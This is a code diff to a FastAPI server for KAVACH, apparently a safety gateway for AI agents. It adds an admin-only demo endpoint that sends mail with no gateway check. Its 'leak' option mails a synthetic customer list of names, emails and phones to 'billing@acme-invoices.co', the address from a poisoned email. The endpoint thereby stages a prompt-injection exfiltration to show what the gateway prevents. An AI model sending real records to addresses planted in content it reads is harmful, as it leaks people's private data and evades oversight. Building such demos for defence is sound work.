@@ -38,6 +38,7 @@ from fastapi.staticfiles import StaticFiles
 from pydantic import BaseModel
 
 from . import auth
+from .addresses import parse_recipients
 from .environment import MAIL_RECALL_S, PAYMENT_HOLD_S, Environment
 from .gateway import Kavach
 from .models import ToolCall
@@ -579,6 +580,37 @@ def settle(advance_s: float = 0.0, who: dict | None = Depends(caller)):
     return {"settled": gw.settle(time.time() + max(0.0, advance_s))}
 
 
+@app.post("/api/stage/direct-send")
+def stage_direct_send(body: dict, who: dict | None = Depends(caller)):
+    """The Live demo's "without KAVACH" side: hands an email straight to the mail server, the way an agent's own mail
+    tool would, with no check, no hold and nothing to cancel. {"leak": true} sends the customer list (synthetic) to
+    the address in the poisoned email. Dev profile only; it exists to show the difference. A receipt still records
+    that the bypass was used, so the audit trail stays honest."""
+    import smtplib
+    from email.message import EmailMessage
+    if not PROFILE.fast_forward or (who is not None and who["role"] != "admin"):
+        raise HTTPException(403, "only an admin, in the dev profile, can send without KAVACH")
+    if env.mailer is None:
+        raise HTTPException(409, "no mail server is configured (scripts/demo_up.sh sets one)")
+    if body.get("leak"):
+        rows = env.crm_query("SELECT name, email, phone FROM customers")
+        to, subject = "billing@acme-invoices.co", "recon"
+        text = "Customer list for reconciliation:\n" + "\n".join(f"{r['name']}, {r['email']}, {r['phone']}" for r in rows)
+    else:
+        to, subject, text = str(body.get("to", "")).strip(), str(body.get("subject", "")), str(body.get("body", ""))
+    rcpts = parse_recipients(to)
+    if not rcpts:
+        raise HTTPException(422, "no recipient address")
+    m = EmailMessage()
+    m["From"], m["To"], m["Subject"], m["X-Sent-By"] = env.mailer.sender, ", ".join(rcpts), subject, "no-KAVACH"
+    m.set_content(text)
+    with smtplib.SMTP(env.mailer.host, env.mailer.port, timeout=10) as smtp:
+        smtp.send_message(m, from_addr=env.mailer.sender, to_addrs=rcpts)
+    gw.receipts.append({"type": "demo-unguarded-send", "to": rcpts, "subject": subject, "chars": len(text),
+                        "note": "Live demo: sent without KAVACH to show the difference (dev profile only)"})
+    return {"sent": True, "to": rcpts, "subject": subject, "lines": text.count("\n") + 1, "at": time.time()}
+
+
 @app.post("/api/stage/reset")
 def stage_reset(who: dict | None = Depends(caller)):
     """The live demo page's Start over: a fresh demo company (anything still waiting is discarded, never sent) and
@@ -708,6 +740,7 @@ def state():
             "waiting": [{**h, "receipt": receipt_of.get(h["id"])} for h in env.holds if h["status"] == "held"],
             "stopped": [h for h in env.holds if h["status"] == "cancelled"][-5:],
             "hold_s": {"mail": MAIL_RECALL_S, "payment": PAYMENT_HOLD_S},
+            "demo": {"mail_to": os.environ.get("KAVACH_DEMO_MAIL_TO")},     # set by demo_up.sh when Gmail is on
             "parked": parked, "drafts": env.drafts[-5:],
             "risk_model": gw.risk.source, "c_block": gw.cfg.c_block, "policy": gw.policy.version,
             "qualcomm_llm": gw.judge.llm.enabled, "judge_models": list(gw.judge.llm.picked or [gw.judge.llm.model])}
